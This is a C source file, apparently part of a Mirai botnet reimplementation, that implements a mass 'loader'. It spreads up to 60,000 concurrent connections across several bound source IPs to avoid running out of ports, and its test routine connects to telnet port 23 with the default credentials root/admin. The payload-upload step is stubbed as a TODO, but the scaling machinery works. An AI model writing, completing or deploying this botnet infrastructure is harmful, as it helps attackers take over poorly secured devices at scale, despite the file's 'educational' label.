/**
 * @file multi_ip_loader.c
 * @brief Multi-IP loader for bypassing port exhaustion
 * 
 * Original Mirai achieved 60k-70k simultaneous connections by:
 * - Binding to multiple source IPs (5 IPs)
 * - ~12k connections per IP (60k total)
 * - Bypassing Linux port exhaustion (65535 ports shared across all connections)
 * 
 * Educational Purpose: Demonstrates how to achieve massive scale by
 * spreading load across multiple source IPs.
 * 
 * @author Mirai 2026 Research Team
 * @date 2026-02-25
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/resource.h>
#include <time.h>

#define MAX_SOURCE_IPS      16
#define MAX_CONNECTIONS     65535
#define EPOLL_MAX_EVENTS    1024
#define CONNECT_TIMEOUT     30
#define LOADER_BUFFER_SIZE  4096

typedef enum {
    CONN_STATE_CONNECTING = 0,
    CONN_STATE_CONNECTED,
    CONN_STATE_LOADING,
    CONN_STATE_VERIFYING,
    CONN_STATE_DONE,
    CONN_STATE_ERROR
} connection_state_t;

typedef struct {
    int fd;
    connection_state_t state;
    struct sockaddr_in target;
    struct sockaddr_in source;  // Source IP binding
    time_t start_time;
    
    char username[256];
    char password[256];
    
    size_t bytes_sent;
    size_t bytes_received;
} loader_connection_t;

typedef struct {
    uint32_t ip;
    int connections_count;
    int max_connections;  // Per-IP limit
} source_ip_t;

typedef struct {
    int epoll_fd;
    
    source_ip_t source_ips[MAX_SOURCE_IPS];
    size_t source_ip_count;
    
    loader_connection_t *connections;
    size_t max_connections;
    size_t active_connections;
    
    // Statistics
    struct {
        uint64_t total_attempts;
        uint64_t successful_loads;
        uint64_t failed_loads;
        uint64_t timeouts;
    } stats;
} multi_ip_loader_t;

/**
 * Set file descriptor limits to allow massive concurrent connections
 */
static int set_ulimits(size_t target_fds) {
    struct rlimit rl;
    
    // Get current limits
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Failed to get current RLIMIT_NOFILE: %s\n", strerror(errno));
        return -1;
    }
    
    printf("Current RLIMIT_NOFILE: soft=%lu, hard=%lu\n", rl.rlim_cur, rl.rlim_max);
    
    // Set to target (or max)
    rl.rlim_cur = target_fds;
    if (rl.rlim_cur > rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
    }
    
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Failed to set RLIMIT_NOFILE to %lu: %s\n", 
                rl.rlim_cur, strerror(errno));
        fprintf(stderr, "Try running: ulimit -n %lu\n", target_fds);
        return -1;
    }
    
    printf("Set RLIMIT_NOFILE to %lu\n", rl.rlim_cur);
    return 0;
}

/**
 * Initialize multi-IP loader
 */
int multi_ip_loader_init(multi_ip_loader_t *loader, size_t max_connections) {
    if (!loader) return -1;
    
    memset(loader, 0, sizeof(multi_ip_loader_t));
    loader->max_connections = max_connections;
    
    // Set ulimits
    if (set_ulimits(max_connections + 1024) != 0) {
        fprintf(stderr, "Warning: Could not set ulimits, may fail at scale\n");
    }
    
    // Create epoll instance
    loader->epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (loader->epoll_fd < 0) {
        fprintf(stderr, "Failed to create epoll: %s\n", strerror(errno));
        return -1;
    }
    
    // Allocate connection pool
    loader->connections = calloc(max_connections, sizeof(loader_connection_t));
    if (!loader->connections) {
        fprintf(stderr, "Failed to allocate connection pool: %s\n", strerror(errno));
        close(loader->epoll_fd);
        return -1;
    }
    
    // Initialize all connections as unused
    for (size_t i = 0; i < max_connections; i++) {
        loader->connections[i].fd = -1;
        loader->connections[i].state = CONN_STATE_DONE;
    }
    
    printf("Multi-IP loader initialized: max_connections=%zu\n", max_connections);
    return 0;
}

/**
 * Add a source IP to the pool
 */
int multi_ip_loader_add_source_ip(multi_ip_loader_t *loader, const char *ip_str, 
                                  int max_connections_per_ip) {
    if (!loader || loader->source_ip_count >= MAX_SOURCE_IPS) {
        return -1;
    }
    
    uint32_t ip = inet_addr(ip_str);
    if (ip == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address: %s\n", ip_str);
        return -1;
    }
    
    source_ip_t *src = &loader->source_ips[loader->source_ip_count];
    src->ip = ip;
    src->connections_count = 0;
    src->max_connections = max_connections_per_ip;
    
    loader->source_ip_count++;
    
    printf("Added source IP: %s (max_conn=%d)\n", ip_str, max_connections_per_ip);
    return 0;
}

/**
 * Select best source IP for new connection (least loaded)
 */
static source_ip_t *select_source_ip(multi_ip_loader_t *loader) {
    if (loader->source_ip_count == 0) {
        return NULL;
    }
    
    source_ip_t *best = NULL;
    
    for (size_t i = 0; i < loader->source_ip_count; i++) {
        source_ip_t *src = &loader->source_ips[i];
        
        // Skip if at capacity
        if (src->connections_count >= src->max_connections) {
            continue;
        }
        
        // Select least loaded
        if (!best || src->connections_count < best->connections_count) {
            best = src;
        }
    }
    
    return best;
}

/**
 * Find free connection slot
 */
static loader_connection_t *find_free_connection(multi_ip_loader_t *loader) {
    for (size_t i = 0; i < loader->max_connections; i++) {
        if (loader->connections[i].fd == -1) {
            return &loader->connections[i];
        }
    }
    return NULL;
}

/**
 * Create connection with source IP binding
 */
int multi_ip_loader_connect(multi_ip_loader_t *loader, 
                            const char *target_ip, uint16_t target_port,
                            const char *username, const char *password) {
    // Select source IP
    source_ip_t *source = select_source_ip(loader);
    if (!source) {
        fprintf(stderr, "No available source IPs\n");
        return -1;
    }
    
    // Find free connection slot
    loader_connection_t *conn = find_free_connection(loader);
    if (!conn) {
        fprintf(stderr, "Connection pool exhausted\n");
        return -1;
    }
    
    // Create socket
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        fprintf(stderr, "socket() failed: %s\n", strerror(errno));
        return -1;
    }
    
    // Set non-blocking
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    
    // Enable SO_REUSEADDR to maximize port reuse
    int reuse = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    // Bind to source IP (critical for multi-IP loading!)
    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = source->ip;
    bind_addr.sin_port = 0;  // Let kernel assign source port
    
    if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        fprintf(stderr, "bind() to source IP failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    
    // Setup target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    target_addr.sin_port = htons(target_port);
    
    // Initiate connection
    int ret = connect(fd, (struct sockaddr *)&target_addr, sizeof(target_addr));
    if (ret < 0 && errno != EINPROGRESS) {
        fprintf(stderr, "connect() failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    
    // Add to epoll
    struct epoll_event ev;
    ev.events = EPOLLOUT | EPOLLIN | EPOLLERR | EPOLLHUP;
    ev.data.ptr = conn;
    
    if (epoll_ctl(loader->epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        fprintf(stderr, "epoll_ctl() failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    
    // Initialize connection
    conn->fd = fd;
    conn->state = CONN_STATE_CONNECTING;
    conn->target = target_addr;
    conn->source = bind_addr;
    conn->start_time = time(NULL);
    strncpy(conn->username, username, sizeof(conn->username) - 1);
    strncpy(conn->password, password, sizeof(conn->password) - 1);
    
    // Update counters
    source->connections_count++;
    loader->active_connections++;
    loader->stats.total_attempts++;
    
    return 0;
}

/**
 * Handle connection event
 */
static void handle_connection_event(multi_ip_loader_t *loader, 
                                    loader_connection_t *conn,
                                    uint32_t events) {
    // Check for errors
    if (events & (EPOLLERR | EPOLLHUP)) {
        loader->stats.failed_loads++;
        conn->state = CONN_STATE_ERROR;
        return;
    }
    
    // Check for timeout
    if (time(NULL) - conn->start_time > CONNECT_TIMEOUT) {
        loader->stats.timeouts++;
        conn->state = CONN_STATE_ERROR;
        return;
    }
    
    switch (conn->state) {
        case CONN_STATE_CONNECTING:
            if (events & EPOLLOUT) {
                // Check if connection succeeded
                int error = 0;
                socklen_t len = sizeof(error);
                getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &error, &len);
                
                if (error == 0) {
                    conn->state = CONN_STATE_CONNECTED;
                    printf("Connected to %s:%d from %s\n",
                           inet_ntoa(conn->target.sin_addr),
                           ntohs(conn->target.sin_port),
                           inet_ntoa(conn->source.sin_addr));
                    
                    // TODO: Proceed with loading (send exploit, upload binary, etc.)
                    // For now, mark as successful
                    loader->stats.successful_loads++;
                    conn->state = CONN_STATE_DONE;
                } else {
                    loader->stats.failed_loads++;
                    conn->state = CONN_STATE_ERROR;
                }
            }
            break;
        
        // TODO: Implement LOADING, VERIFYING states
        default:
            break;
    }
}

/**
 * Close and cleanup connection
 */
static void close_connection(multi_ip_loader_t *loader, loader_connection_t *conn) {
    if (conn->fd >= 0) {
        epoll_ctl(loader->epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
        close(conn->fd);
        conn->fd = -1;
    }
    
    // Update source IP counter
    for (size_t i = 0; i < loader->source_ip_count; i++) {
        if (loader->source_ips[i].ip == conn->source.sin_addr.s_addr) {
            loader->source_ips[i].connections_count--;
            break;
        }
    }
    
    loader->active_connections--;
    conn->state = CONN_STATE_DONE;
}

/**
 * Process events (main loop iteration)
 */
int multi_ip_loader_process_events(multi_ip_loader_t *loader, int timeout_ms) {
    struct epoll_event events[EPOLL_MAX_EVENTS];
    
    int nfds = epoll_wait(loader->epoll_fd, events, EPOLL_MAX_EVENTS, timeout_ms);
    if (nfds < 0) {
        if (errno != EINTR) {
            fprintf(stderr, "epoll_wait() failed: %s\n", strerror(errno));
            return -1;
        }
        return 0;
    }
    
    for (int i = 0; i < nfds; i++) {
        loader_connection_t *conn = (loader_connection_t *)events[i].data.ptr;
        handle_connection_event(loader, conn, events[i].events);
        
        // Close if done or error
        if (conn->state == CONN_STATE_DONE || conn->state == CONN_STATE_ERROR) {
            close_connection(loader, conn);
        }
    }
    
    return nfds;
}

/**
 * Print statistics
 */
void multi_ip_loader_print_stats(multi_ip_loader_t *loader) {
    printf("\n=== Loader Statistics ===\n");
    printf("Active connections: %zu / %zu\n", 
           loader->active_connections, loader->max_connections);
    printf("Total attempts: %lu\n", loader->stats.total_attempts);
    printf("Successful loads: %lu\n", loader->stats.successful_loads);
    printf("Failed loads: %lu\n", loader->stats.failed_loads);
    printf("Timeouts: %lu\n", loader->stats.timeouts);
    
    printf("\nSource IPs:\n");
    for (size_t i = 0; i < loader->source_ip_count; i++) {
        source_ip_t *src = &loader->source_ips[i];
        struct in_addr addr = { .s_addr = src->ip };
        printf("  %s: %d / %d connections\n",
               inet_ntoa(addr), src->connections_count, src->max_connections);
    }
    printf("========================\n\n");
}

/**
 * Cleanup loader
 */
void multi_ip_loader_cleanup(multi_ip_loader_t *loader) {
    if (!loader) return;
    
    // Close all connections
    for (size_t i = 0; i < loader->max_connections; i++) {
        if (loader->connections[i].fd >= 0) {
            close_connection(loader, &loader->connections[i]);
        }
    }
    
    if (loader->epoll_fd >= 0) {
        close(loader->epoll_fd);
    }
    
    free(loader->connections);
    
    printf("Multi-IP loader cleanup complete\n");
}

/**
 * Example usage / test
 */
#ifdef STANDALONE_TEST
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <source_ip1> [source_ip2] ...\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.100 192.168.1.101\n", argv[0]);
        return 1;
    }
    
    multi_ip_loader_t loader;
    
    // Initialize with capacity for 60k connections
    if (multi_ip_loader_init(&loader, 60000) != 0) {
        return 1;
    }
    
    // Add source IPs from command line (12k per IP)
    for (int i = 1; i < argc; i++) {
        if (multi_ip_loader_add_source_ip(&loader, argv[i], 12000) != 0) {
            fprintf(stderr, "Failed to add source IP: %s\n", argv[i]);
        }
    }
    
    // Test: Create a few connections
    printf("Creating test connections...\n");
    for (int i = 0; i < 10; i++) {
        multi_ip_loader_connect(&loader, "192.168.1.1", 23, "root", "admin");
    }
    
    // Event loop
    printf("Processing events...\n");
    time_t last_stats = time(NULL);
    
    while (loader.active_connections > 0) {
        multi_ip_loader_process_events(&loader, 1000);
        
        // Print stats every 5 seconds
        if (time(NULL) - last_stats >= 5) {
            multi_ip_loader_print_stats(&loader);
            last_stats = time(NULL);
        }
    }
    
    // Final stats
    multi_ip_loader_print_stats(&loader);
    
    // Cleanup
    multi_ip_loader_cleanup(&loader);
    
    return 0;
}
#endif
